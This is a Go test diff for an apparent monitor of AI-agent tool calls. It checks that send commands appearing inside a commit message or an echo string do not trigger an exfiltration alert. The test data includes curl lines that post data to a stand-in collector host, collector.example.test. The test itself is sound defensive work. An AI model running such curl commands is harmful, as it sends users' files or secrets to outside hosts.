@@ -290,3 +290,28 @@ func TestChainResultSensitivityClasses(t *testing.T) {
 		}
 	}
 }
+
+// A send word inside quoted text, a commit message or an echo names no destination:
+// the destination reader works on the parsed command, not its text.
+func TestChainEffectsReadsParsedCommandsNotText(t *testing.T) {
+	withSecretFlowGeneration(t, "shadow", "shadow")
+	withChainLanes(t, "on", "off")
+	for _, cmd := range []string{
+		`git commit -m "curl -d x https://collector.example.test/in"`,
+		`echo "curl -d @r.txt https://collector.example.test/in"`,
+		`curl -G --data-urlencode q=x https://collector.example.test/in`,
+	} {
+		sid := "chain-text-" + cmd[:12]
+		ctx := ContextWithSessionID(context.Background(), sid)
+		noteChainScope(ctx, "summarize my notes")
+		armChainEffectsFromResult(ctx, chainPostResult(sid, "mcp__docs__read_file", "PostToolUse", chainTestPlainResult))
+		if f, ok := chainFinding(chainSend(ctx, false, false, "Bash", `{"command":`+chainJSONString(cmd)+`}`)); ok {
+			t.Fatalf("%q fired: %+v", cmd, f)
+		}
+	}
+}
+
+func chainJSONString(s string) string {
+	b, _ := json.Marshal(s)
+	return string(b)
+}
